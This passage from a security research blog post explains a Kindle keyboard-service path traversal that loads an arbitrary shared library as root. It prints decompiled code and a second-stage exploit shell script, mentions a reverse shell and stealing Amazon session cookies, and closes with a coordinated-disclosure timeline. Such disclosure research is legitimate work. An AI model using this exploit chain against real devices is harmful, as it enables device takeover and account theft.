</code></pre><p>As the <code>framework</code> user, we can easily create this file, and therefore effectively add a new language named <code>../../../mnt/us/documents</code> to the list.</p><p>Once the language list has been successfully edited, we can load the newly added language by setting the <code>language</code> property to <code>../../../mnt/us/documents</code>.</p><p>It turns out that the setter handler for the <code>language</code> property (<code>lang_set_language</code>) uses the same format string: the path traversal works once again, and we are able to load a custom keymap.</p><p>At first, we thought that loading a custom keymap would seal the deal. For example, keymap file formats sometimes include the ability to run a shell command upon key press. But the Kindle&rsquo;s keymap format is merely a JSON that describes how keys should be positioned on the screen, and does not expose much surface.</p><p>Luckily, at this point, code execution was actually even closer than expected. Once the keymap is loaded, libkb enters the <code>input_load_language</code> function, which does the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-c data-lang=c><span style=display:flex;background-color:#3c3d38><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>_snprintf_chk</span>(path, <span style=color:#ae81ff>4096</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>4096</span>, <span style=color:#e6db74>&#34;/usr/share/keyboard/%s/utils.so&#34;</span>, lang) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>4096</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex;background-color:#3c3d38><span>handle <span style=color:#f92672>=</span> <span style=color:#a6e22e>dlopen</span>(path, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>handle) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((g_lab126_log_mask <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x2000000</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_syslog_chk</span>(<span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;E def:kb:filename=%s:Failed to load plugin&#34;</span>, path);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>off_2681C <span style=color:#f92672>=</span> <span style=color:#a6e22e>dlsym</span>(v2, <span style=color:#e6db74>&#34;utils_set_auto_caps&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// ...
</span></span></span></code></pre></div><p>Again, a third path traversal: in our case, this will dlopen <code>/mnt/us/documents/utils.so</code>. <strong>We can load an arbitrary shared library</strong>!</p><p>To achieve code execution as root, it is therefore sufficient to cross-compile a shared library with an <code>__attribute__((constructor))</code> function to <code>/mnt/us/documents/utils.so</code>. The constructor function will be executed when <code>dlopen</code> is called.</p><p>Thanks to built-in LIPC utilities, the exploit for this bug fits in a few lines of code, and we come up with the following second stage shell script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># Delete first stage aax payload or the scanner will keep crashing</span>
</span></span><span style=display:flex><span>rm /mnt/us/audible/new.aax  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Copy an existing keymap to controlled folder to bypass verification</span>
</span></span><span style=display:flex><span>cp /usr/share/keyboard/en_GB/en_GB-1072x1448.keymap.gz /mnt/us/documents-1072x1448.keymap.gz
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Prepare third-stage shared library</span>
</span></span><span style=display:flex><span>PAYLOAD<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;base64-encoded ELF&gt;&#39;</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;</span>$PAYLOAD<span style=color:#e6db74>&#34;</span> | base64 -d &gt; /mnt/us/documents/utils.so
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Trigger vulnerability</span>
</span></span><span style=display:flex><span>lipc-set-prop com.lab126.keyboard languages en_GB:../../../mnt/us/documents
</span></span><span style=display:flex><span>lipc-set-prop com.lab126.keyboard language ../../../mnt/us/documents
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Keyboard is broken after this stage, need to restart the UI</span>
</span></span><span style=display:flex><span><span style=color:#75715e># but this is left as an exercise for the *reader* :)</span>
</span></span></code></pre></div><p>Note that shared libraries can be loaded through <code>dlopen</code> without being executable.</p><p>The <code>utils.so</code> binary can finally execute a third stage payload, such as:</p><ul><li>connecting to a reverse shell</li><li>running post-jailbreak logic (e.g. installing developer keys, enabling debugging features&mldr;)</li></ul><p>Once the final payload is executed and <code>dlopen</code> returns, the keyboard process will most likely crash and may not restart â€” this could be avoided by exporting the symbols expected by libkb.</p><h1 id=conclusion>Conclusion</h1><p>In this post, we tackled some Kindle internals and discussed a chain of two vulnerabilities that could allow an attacker to remotely take full control of an e-reader.</p><p>Here is a video demonstrating the attack:</p><video class=video-shortcode preload controls width=100%>
<source src=/posts/img/kindle/demo.mp4 type=video/mp4></video><p>In this video, we simulate the attack vector by dropping the malicious audiobook to the Kindle via the USB connection (in a real scenario, it could be downloaded online).</p><p>A few moments later, we update the device&rsquo;s screen to show proof of exploitation: we print the output of the <code>id</code> command, indicating that we managed to get root access, and we also show that we are able to retrieve Amazon session cookies (which could be exfiltrated to a remote server).</p><p>We will conclude this blog post with a few takeaways.</p><p>First, <strong>impact</strong>: some devices from our everyday lives may seem harmless, but shelter a large surface and valuable assets for an attacker. You definitely don&rsquo;t want your Kindle to be hacked!</p><p>The surfaces in which we found bugs are also present in other applications or devices: the AAX library is reused in Audible
apps on many platforms (including desktop / mobile), and the LIPC library can be found in other Amazon products such as the
Amazon Echo, multiplying the impact.</p><p>In terms of <strong>vulnerability research</strong>, we saw that in big and complex parsers, generic fuzzing may not always be very effective. Fuzzing multimedia is all the more difficult as seeds get very large.</p><p>Instead, leveraging a bottom-up approach by looking for vulnerable patterns in the code base, even if done the dirty way by exporting decompiled code and grepping around, can sometimes give fruitful results more quickly: you don&rsquo;t <em>always</em> need heavy tooling.</p><p>Finally, as far as <strong>exploitation</strong> goes, we observed that one-shot parsers are particularly hard to address. Here, three elements made life a bit easier:</p><ul><li>32-bit architecture (lower ASLR entropy);</li><li>having a nice allocation primitive to spray the virtual address space;</li><li>lack of modern mitigations (e.g. control flow integrity, object type integrity, pointer authentication, memory tagging&mldr;).</li></ul><p>Even with that, we were unable to come up with a fully reliable exploit â€” but we also learned that depending on the case, unreliable exploits may not be wasted labor and can still have an impact.</p><p>The vulnerabilities showcased in this post were reported through the <a href=https://hackerone.com/amazonvrp-devices>Amazon Vulnerability Research Program</a> on HackerOne. The Audible bug was fixed in firmware version 5.18.1 and the keyboard service bug in firmware version 5.18.5.</p><p>We open-sourced the code for the different exploits and the fullchain <a href=https://github.com/face0xff/kindle-audible-exploit-chain>here</a>.</p><h2 id=timeline>Timeline</h2><ul><li><strong>16-01-2025</strong>: sent bug reports on HackerOne.</li><li><strong>17-01-2025</strong>: bugs are triaged by HackerOne.</li><li><strong>29-01-2025</strong>: Amazon assessed both reports to be <em>High</em> severity, but considered the severity of the two-bug chain as a whole to be <em>Critical</em> and awarded $20,000 bounty accordingly.</li><li><strong>22-03-2025</strong>: asked for Amazon&rsquo;s consent to publicly disclose details about the vulnerabilities once they are patched.</li><li><strong>25-03-2025</strong>: Amazon pushed fix for the Audible bug in 5.18.1.</li><li><strong>15-09-2025</strong>: Amazon pushed fix for the keyboard service bug in 5.18.5.</li><li><strong>10-11-2025</strong>: Amazon agreed with the disclosure (at last!).</li><li><strong>18-11-2025</strong>: spoke at <a href=https://codeblue.jp/en/program/time-table/day1-t1-04/>CODE BLUE 2025</a>.</li><li><strong>11-12-2025</strong>: spoke at <a href=https://blackhat.com/eu-25/briefings/schedule/#dont-judge-an-audiobook-by-its-cover-taking-over-your-amazon-account-with-a-kindle-48836>Black Hat Europe 2025</a>.</li></ul></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/vulnerability-research>#Vulnerability Research</a></div><div class=tag><a href=/tags/exploit>#Exploit</a></div><div class=tag><a href=/tags/rce>#RCE</a></div></div><span class=date>2025-12-16
<span class=author>by
Valentino Ricotta</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2025, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>